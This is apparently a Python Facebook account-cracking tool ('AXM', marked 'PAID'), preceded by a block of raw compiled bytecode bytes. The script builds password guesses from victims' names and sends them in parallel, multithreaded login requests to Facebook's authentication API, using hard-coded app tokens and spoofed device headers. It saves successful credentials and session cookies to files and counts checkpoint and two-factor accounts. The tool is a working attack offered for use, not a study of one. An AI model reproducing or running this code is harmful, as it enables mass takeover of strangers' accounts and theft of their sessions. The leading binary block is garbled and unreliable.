\x02N%\x03c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3*\x06\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00d\x01}\x01d\x02}\x02\t\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03d\x04\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x06}\x03d\x07\x84\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\t|\x01\x9b\x00d\n\x9d\x03}\x07d\x0b|\x02i\x01}\x08d\x0b|\x02i\x01}\td\x0c|\x06i\x01}\n|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x06}\x03d\x0e\x84\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\t|\x01\x9b\x00d\n\x9d\x03}\x07d\x0b|\x02i\x01}\x08d\x0b|\x02i\x01}\td\x0c|\x06i\x01}\n|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02
#_____________________[BIT & DATE BOX]____________________________#
bit = platform.architecture()[0]
z = f'{W}[{G}✗{W}] '
age = f'{W}[{G}';pore = f'{W}] '
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+f'{W}-{G}'+str(bln)+f'{W}-{G}'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#---------------------------------------------[UPDATE SERVER]---------------------------------------------#
axm1 = requests.get("Add your server url").text.strip()
axm2 = requests.get("Add your server url").text.split('\n')[0]
axm3 = requests.get("Add your server url").text.strip()
axm4 = requests.get("Add your server url").text.strip()
#---------------------------------------------[FILE UPDATE]---------------------------------------------#
arafat1 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{axm1}'
arafat2 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{axm2}'
arafat3 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{axm3}'
arafat4 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{axm4}'
#_____________________[ANIMATION BOX]____________________________#
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.1)
#__________________[ TOOL VERSION ]__________________#
try:
    version = requests.get("htt"+"ps://r"+"aw.git"+"hubus"+"erc"+"onten"+"t.com/AR"+"AFAT-"+"X-MI"+"TUL/AC"+"CE"+"SS/ma"+"in/vers"+"ion.txt").text
except:
    print('No Internet Connection');exit()
version = version.strip()
session = requests.Session()
#_____________________[MAIN CLASS BOX]____________________________#
class __Main_all_sys___for__run__:
    def __init__(self):
        self.line = f'{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
        self.logo = (f"""\n {logo} █████  ██   ██ ███    ███  {W}┃ \n {logo}██   ██  ██ ██  ████  ████  {W}┃     \n {logo}███████   ███   ██ ████ ██  {W}┃ SIM {R}× {G}{ahydra}\n {logo}██   ██  ██ ██  ██  ██  ██  {W}┃ DEVICE {R}× {G}{bit}\n {logo}██   ██ ██   ██ ██      ██  {W}┃ VERSION {R}× {G}PAID {R}× {G}{version}\n{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━\n          {R}× {G}AXM AGAIN BACK WITH NEW LOOK {R}×\n{self.line}\n{z}{W}AUTHOR  : {G}ALTALIMUL ISLAM {W}({G4}MITUL{W})\n{z}{W}OWNER   : {G}ARAFAT AHAMMED\n{z}{W}GITHUB  : {G}ARAFAT-X-MITUL \n{z}{W}TOOL    : {G}FILE {R}× {G}RANDOM\n{self.line}""")
#_____________________[END BOX]____________________________#
    def __end__(self,ok,cp,twf):
        print(self.line)
        print(f'{z}{G}THE PROCESS HAS BEEN COMPLETED....!\n{z}TOTAL OK IDS : {G}{len(ok)}\n{z}TOTAL CP IDS : {R}{len(cp)}\n{z}TOTAL 2F IDS : {B}{len(twf)}\n{self.line}')
        ax = input(f'{z}DO YOU WANT TO CRACK AGAIN ({G}y{W}/{R}n{W}) : {G}')
        if ax in ['1','y','Y','yes','Yes','YES']:__Main_all_sys___for__run__().___file__RanD_All__()
        else:exit(f'{self.line}\n{z}{G}THANKS FOR USING OUR TOOL.....!')
#_____________________[LOGO BOX]____________________________#
    def __logo__(self):
        os.system('clear')
        print(self.logo)
#_____________________[MENU BOX]____________________________#
    def ___file__RanD_All__(self):
        __Main_all_sys___for__run__().__logo__();print(f'{age}1{pore}START RANDOM CLONE\n{age}2{pore}START FILE CLONE\n{age}3{pore}START FILE MAKE\n{age}4{pore}REPORT BUG \n{age}5{pore}EXIT TERMINAL\n{self.line}')
        ch = input(f'{z}CHOOSE : {G}')
        if ch in ['1','a','A']:os.system("./RANDOM")
        elif ch in ['2','b','B']:__Main_all_sys___for__run__().__fILe_MenU__()
        elif ch in ['3','c','C']:__Main_all_sys___for__run__().__logo__();animation(f'{z}{G}COMING SOON.....!');time.sleep(3);__Main_all_sys___for__run__().___file__RanD_All__()
        elif ch in ['4','d','D']:os.system('xdg-open https://www.facebook.com/100082346206254');sleep(4);__Main_all_sys___for__run__().__logo__();animation(f'{z}{G}THANKS FOR YOUR FEEDBACK....!');sleep(2);__Main_all_sys___for__run__().__logo__();animation(f'{z}{G}RESTARTING THE TOOL.......!');sleep(0.5);__Main_all_sys___for__run__().___file__RanD_All__()
        elif ch in ['5','e','E']:exit(f'{self.line}\n{z}{G}THANKS FOR USING OUR TOOL.....!')
        else:print(f'{z}{R}SORRY WRONG INPUT....!');sleep(3);__Main_all_sys___for__run__().__logo__();animation(f'{z}{G}RESTARTING THE TOOL.....!');sleep(2);__Main_all_sys___for__run__().___file__RanD_All__()
#_____________________[FILE MENU BOX]____________________________#
    def __fILe_MenU__(self):
        __Main_all_sys___for__run__().__logo__()
        file = input(f'{z}INPUT FILE PATH : {G}')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print(f'{z}{R}SORRY FILE NOT FOUND.....!');sleep(3);__Main_all_sys___for__run__().__logo__();animation(f'{z}{G}TRYING AGAIN.......!');sleep(1);__Main_all_sys___for__run__().__fILe_MenU__()
        __Main_all_sys___for__run__().__logo__()
        print(f'{age}1{pore}METHOD A {W}[{G}S1{W}]\n{age}2{pore}METHOD B {W}[{G}S2{W}]\n{age}3{pore}METHOD C {W}[{G}S3{W}]\n{age}4{pore}METHOD D {W}[{G}S4{W}]\n{self.line}')
        meth = input(f'{z}CHOOSE : {G}')
        __Main_all_sys___for__run__().__logo__()
        plist=[]
        print(f'{age}1{pore}CRACK WITH AUTO PASS\n{age}2{pore}CRACK WITH MANUAL PASS\n{self.line}')
        xdx = input(f'{z}CHOOSE : {G}')
        if xdx in ['1','a','A']:
            __Main_all_sys___for__run__().__logo__()
            ps_limit = 'AUTO PASS'
            print(f'{age}1{pore}CRACK WITH BD PASSLIST    {G}[{W} 32 PASS {G}]\n{age}2{pore}CRACK WITH INDIA PASSLIST\n{age}3{pore}CRACK WITH NEPAL PASSLIST\n{age}4{pore}CRACK WITH BD PASSLIST    {G}[{W} 19 PASSWORD {G}]\n{self.line}')
            coun = input(f'{z}CHOOSE : {G}')
            if coun in ['1','a','A']:plist.append('first last');plist.append('firstlast');plist.append('First Last');plist.append('first12345');plist.append('first1234');plist.append('first123');plist.append('first12');plist.append('first1');plist.append('first11');plist.append('first111');plist.append('first1212');plist.append('first1122');plist.append('first22');plist.append('first@');plist.append('@first@');plist.append('first@@');plist.append('last12345');plist.append('last1234');plist.append('last123');plist.append('last12');plist.append('last1');plist.append('last11');plist.append('last111');plist.append('last1212');plist.append('last1122');plist.append('last@');plist.append('@last@');plist.append('last@@');plist.append('last22');plist.append('firstlast1234');plist.append('firstlast123');plist.append('firstlast12')
            elif coun in ['2','b','B']:plist.append('first last');plist.append('firstlast');plist.append('57273200');plist.append('59039200');plist.append('57575751')
            elif coun in ['3','c','C']:plist.append('first123456');plist.append('first12345');plist.append('first1234');plist.append('first123');plist.append('first12');plist.append('first111');plist.append('first@1');plist.append('first@123');plist.append('firstfirst');plist.append('firstlast');plist.append('firstlast123');plist.append('last123');plist.append('first first');plist.append('first last');plist.append('sangma');plist.append('tamang');plist.append('nepal123')
            elif coun in ['4','d','D']:plist.append('firstlast');plist.append('first last');plist.append('first');plist.append('first@');plist.append('first123');plist.append('first@@@');plist.append('first1234');plist.append('first1122');plist.append('first12345');plist.append('first@@');plist.append('first12');plist.append('first11');plist.append('first1');plist.append('first00');plist.append('@12345@');plist.append('@123456@');plist.append('@1234567@');plist.append('@first@');plist.append('first@#')
            else:plist.append('firstlast');plist.append('first last');plist.append('first@1');plist.append('first123');plist.append('last11')
        elif xdx in ['2','b','B']:
            try:
                __Main_all_sys___for__run__().__logo__()
                ps_limit = int(input(f'{z}HOW MANY PASS DO YOU WANT TO ADD ? : {G}'))
            except:
                ps_limit = 5
            __Main_all_sys___for__run__().__logo__()
            print(f'{z}BD PASSLIST  : {G}first last{W}, {G}first123 etc...\n{z}IND PASSLIST : {G}59039200{W}, {G}57575751{W}, {G}57273200 etc...\n{z}NEP PASSLIST : {G}first last{W}, {G}sangma{W}, {G}tamang etc...\n{self.line}')
            for i in range(ps_limit):
                plist.append(input(f'{z}ENTER PASSWORD [{G}{i+1}{W}] : {G}'))
                print(self.line)
        __Main_all_sys___for__run__().__logo__()
        cpi = input(f'{z}DO YOU WANT TO SHOW CP ID ({G}y{W}/{R}n{W}) : {G}')
        if cpi in ['1','y','Y','yes','Yes','YES']:cpx.append('y')
        else:cpx.append('n')
        __Main_all_sys___for__run__().__logo__()
        twi = input(f'{z}DO YOU WANT TO SHOW 2F ID ({G}y{W}/{R}n{W}) : {G}')
        if twi in ['1','y','Y','yes','Yes','YES']:twx.append('y')
        else:cpx.append('n')
        __Main_all_sys___for__run__().__logo__()
        coi = input(f'{z}DO YOU WANT TO SHOW COOKIE ({G}y{W}/{R}n{W}) : {G}')
        if coi in ['1','y','Y','yes','Yes','YES']:cokix.append('y')
        else:cokix.append('n')
        with Tred(max_workers=45) as XDX:
            __Main_all_sys___for__run__().__logo__()
            print(f'{z}TOTAL UID  : {G}{len(fo)}\n{z}PASS LIMIT : {G}{ps_limit}\n{z}TODAY DATE : {G}{date}\n{z}USE AIRPLANE MODE {G}ON{W}/{R}OFF {W}FOR MORE OK IDS \n{self.line}')
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                limit = str(len(fo))
                if meth in ['1','a','A']:XDX.submit(self.__file__s1__,ids,names,limit,passlist)
                elif meth in ['2','b','B']:XDX.submit(self.__file__s2__,ids,names,limit,passlist)
                elif meth in ['3','c','C']:XDX.submit(self.__file__s3__,ids,names,limit,passlist)
                elif meth in ['4','d','D']:XDX.submit(self.__file__s4__,ids,names,limit,passlist)
        __Main_all_sys___for__run__().__end__(ok,cp,twf)
#_____________________[FILE METHOD S1]____________________________#
    def __file__s1__(self,ids,names,limit,passlist):
        try:
            global ok,cp,twf,loop,okx
            sys.stdout.write(f"\r\r{W}[{G}CRACKING{W}|{G}S1{W}] [{G3}{loop}{W}/{G4}{limit}{W}] [{G}{len(ok)}{W}/{R}{len(cp)}{W}/{B}{len(twf)}{W}]");sys.stdout.flush()
            fs = names.split(' ')[0]
            try:
                ls = names.split(' ')[1]
            except:
                ls = fs
            for pw in passlist:
                pas = pw.replace('first',fs.lower()).replace('First',fs.capitalize()).replace('last',ls.lower()).replace('Last',ls.capitalize()).replace('Name',names)
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()), "format": "json", "device_id": str(uuid.uuid4()), "cpl": "true", "family_device_id": str(uuid.uuid4()), "credentials_type": "device_based_login_password", "error_detail_type": "button_with_disabled", "source": "device_based_login", "email": ids, "password": pas, "access_token": "256002"+"347743"+"983|374e"+"60f8b9bb6b"+"8cbb30f7803"+"0438895", "generate_session_cookies": "1", "meta_inf_fbmeta": "", "advertiser_id": str(uuid.uuid4()), "currently_logged_in_userid": "0", "locale": "en_GB", "client_country_code": "GB","method": "auth.login", "fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler", "api_key": "882a8490361da98702bf97a021ddc14d"}
                    headers = {'User-Agent': arafat1, 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'Authorization':'OAuth 3506'+'85531'+'728%257C6'+'2f8ce9f74b'+'12f84c123c'+'c23437'+'a4a32', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                    q = session.post("https://a"+"pi.face"+"book.com/au"+"th/lo"+"gin",data=data, headers=headers, allow_redirects=False).json()
                    twwf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        print(f'\r\r{W}[{G}::{W}] {W}[{G}AXM-OK{W}] {G}{ids} {R}× {G}{pas}')
                        ok.append(ids)
                        open('/sdcard/AXM-FILE-M1-OK.txt', 'a').write(ids+'|'+pas+"\n")
                        open('/sdcard/AXM-FILE-M1-COOKIES.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                        if 'y' in cokix:
                            print(f'\r\r{W}[{G}::{W}] {W}[{G}COOKIE{W}] {R}× {G}{coki}');print(self.line)
                            break
                    elif 'www.facebook.com' in q['error']['message']:
                        cp.append(ids)
                        open('/sdcard/AXM-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                        if 'y' in cpx:
                            print(f'\r\r{W}[{R}::{W}] {W}[{R}AXM-CP{W}] {R}{ids} {R}× {R}{pas}')
                            break
                    elif twwf in str(q):
                        twf.append(ids)
                        open('/sdcard/AXM-FILE-M1-2F.txt','a').write(ids+'|'+pas+'\n')
                        if 'y' in twx:
                            print(f'\r\r{W}[{B}::{W}] {W}[{B}AXM-2F{W}] {B}{ids} {R}× {B}{pas}')
                            break
                    else:continue
            loop+=1
        except Exception as e:time.sleep(30)
#_____________________[FILE METHOD S2]____________________________#
    okx=0
    def __file__s2__(self,ids,names,limit,passlist):
        try:
            global ok,cp,twf,loop,okx
            sys.stdout.write(f"\r\r{W}[{G}CRACKING{W}|{G}S2{W}] [{G3}{loop}{W}/{G4}{limit}{W}] [{G}{len(ok)}{W}/{R}{len(cp)}{W}/{B}{len(twf)}{W}]");sys.stdout.flush()
            fs = names.split(' ')[0]
            try:
                ls = names.split(' ')[1]
            except:
                ls = fs
            for pw in passlist:
                pas = pw.replace('first',fs.lower()).replace('First',fs.capitalize()).replace('last',ls.lower()).replace('Last',ls.capitalize()).replace('Name',names)
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()), "format": "json", "device_id": str(uuid.uuid4()), "cpl": "true", "family_device_id": str(uuid.uuid4()), "credentials_type": "device_based_login_password", "error_detail_type": "button_with_disabled", "source": "device_based_login", "email": ids, "password": pas, "access_token": "256002"+"347743"+"983|374e"+"60f8b9bb6b"+"8cbb30f7803"+"0438895", "generate_session_cookies": "1", "meta_inf_fbmeta": "", "advertiser_id": str(uuid.uuid4()), "currently_logged_in_userid": "0", "locale": "en_GB", "client_country_code": "GB","method": "auth.login", "fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler", "api_key": "882a8490361da98702bf97a021ddc14d"}
                    headers = {'User-Agent': arafat2, 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'Authorization':'OAuth 3506'+'85531'+'728%257C6'+'2f8ce9f74b'+'12f84c123c'+'c23437'+'a4a32', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                    q = session.post("https://a"+"pi.face"+"book.com/au"+"th/lo"+"gin",data=data, headers=headers, allow_redirects=False).json()
                    twwf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        print(f'\r\r{W}[{G}::{W}] {W}[{G}AXM-OK{W}] {G}{ids} {R}× {G}{pas}')
                        ok.append(ids)
                        open('/sdcard/AXM-FILE-M2-OK.txt', 'a').write(ids+'|'+pas+"\n")
                        open('/sdcard/AXM-FILE-M2-COOKIES.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                        if 'y' in cokix:
                            print(f'\r\r{W}[{G}::{W}] {W}[{G}COOKIE{W}] {R}× {G}{coki}');print(self.line)
                            break
                    elif 'www.facebook.com' in q['error']['message']:
                        cp.append(ids)
                        open('/sdcard/AXM-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                        if 'y' in cpx:
                            print(f'\r\r{W}[{R}::{W}] {W}[{R}AXM-CP{W}] {R}{ids} {R}× {R}{pas}')
                            break
                    elif twwf in str(q):
                        twf.append(ids)
                        open('/sdcard/AXM-FILE-M2-2F.txt','a').write(ids+'|'+pas+'\n')
                        if 'y' in twx:
                            print(f'\r\r{W}[{B}::{W}] {W}[{B}AXM-2F{W}] {B}{ids} {R}× {B}{pas}')
                            break
                    else:continue
            loop+=1
        except Exception as e:time.sleep(30)
#_____________________[FILE METHOD S3]____________________________#
    okx=0
    def __file__s3__(self,ids,names,limit,passlist):
        try:
            global ok,cp,loop,okx
            sys.stdout.write(f"\r\r{W}[{G}CRACKING{W}|{G}S3{W}] [{G3}{loop}{W}/{G4}{limit}{W}] [{G}{len(ok)}{W}/{R}{len(cp)}{W}/{B}{len(twf)}{W}]");sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                access_token = f'2560'+'02347743'+'983|374e'+'60f8b9bb'+'6b8cbb30f7'+'8030438895'
                fbav = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,70))+'.'+str(random.randint(111,555))
                fbbv = str(random.randint(00000000,99999999))
                fbrv = str(random.randint(00000000,99999999))
                fbsv = str(random.randint(4,16))+'_'+str(random.randint(1,9))+'_'+str(random.randint(1,9))
                fbsv_ = fbsv.replace("_",".")
                model = "iPhone"+str(random.randint(4,16))+','+str(random.randint(1,9))
                abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','X','Y','Z']
                build = str(random.randint(9,19))+random.choice(abc)+str(random.randint(50,199))
                ua = 'Mozilla/5.0 (iPhone, CPU iPhone '+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') [FBAN/FBIOS;FBAV/'+fbav+';FBBV/'+fbbv+';[FBAN/FBIOS;FBAV/411.0.0.33.109;FBBV/466623474;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBID/phone;FBLC/ar_IL;FBOP/5;FBRV/469986951] [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;] [FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;] [FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/Amazon.com;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;] Dalvik/2.1.0 (Linux; U; Android 12; vivo 1920 Build/SP1A.210812.003) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243065;FBCR/Wifi service;FBMF/vivo;FBBD/vivo;FBDV/vivo 1920;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2141};FB_FW/1;] [FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681925;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBRV/213310081;FBCR/alfa;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8142;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;] [FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=2.625,width=2434,height=1096};FBLC/zh_HK;FBRV/334731776;FBCR/my best phone;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-AT52;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]'
                data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'api_key':'c1e620fa708a1d5696fb991c1bde5662',
                'community_id':'',
                'device_id':str(uuid.uuid4()),
                'family_device_id':str(uuid.uuid4()),
                'currently_logged_in_userid':'0',
                'try_num':'1',
                'email':ids,
                'password':pas,
                'generate_analytics_claim':'1',
                'cpl':'true',
                'generate_session_cookies':'1',
                'credentials_type':'password',
                'error_detail_type':'button_with_disabled',
                'source':'auth.login',
                'locale':'fr_FR',
                'client_country_code':'FR',
                'advertising_id':str(uuid.uuid4()),
                'meta_inf_fbmeta':'NO_FILE',
                'access_token':access_token}
                head = {
                'Authorization':'OAuth '+access_token,
                'Host': 'b-graph.facebook.com',
                'X-FB-Connection-Quality':'EXCELLENT',
                'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                'x-fb-net-hni':str(random.randint(2e4,4e4)),
                'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
                'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
                'x-fb-friendly_name':'authenticate',
                'content-encoding':'application/x-www-form-urlencoded',
                'x-tigon-is_retry':'true',
                'x-fb-http-engine':'Liger',
                'x-requested-with':'FBIOS',
                'connection':'keep-alive',
                'user-agent':ua}
                po = session.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
                if 'session_key' in po:
                    ids = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"
                    print(f'\r\r{W}[{G}::{W}] {W}[{G}AXM-OK{W}] {G}{ids} {R}× {G}{pas}')
                    open('/sdcard/AXM-FILE-M3-OK.txt', 'a').write(ids+'|'+pas+"\n")
                    open('/sdcard/AXM-FILE-M3-COOKIES.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                    ok.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    #print(f'\r\r\033[1;33m [AXM-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/AXM-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                    cp.append(ids)
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:pass
#_____________________[FILE METHOD S4]____________________________#
    okx=0
    def __file__s4__(self,ids,names,limit,passlist):
        try:
            global ok,cp,loop,okx
            sys.stdout.write(f"\r\r{W}[{G}CRACKING{W}|{G}S4{W}] [{G3}{loop}{W}/{G4}{limit}{W}] [{G}{len(ok)}{W}/{R}{len(cp)}{W}/{B}{len(twf)}{W}]");sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                access_token = f'66'+'28'+'56837'+'9|c1e62'+'0fa708'+'a1d5'+'696fb99'+'1c1bde'+'5662'
                fbav = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,70))+'.'+str(random.randint(111,555))
                fbbv = str(random.randint(00000000,99999999))
                fbrv = str(random.randint(00000000,99999999))
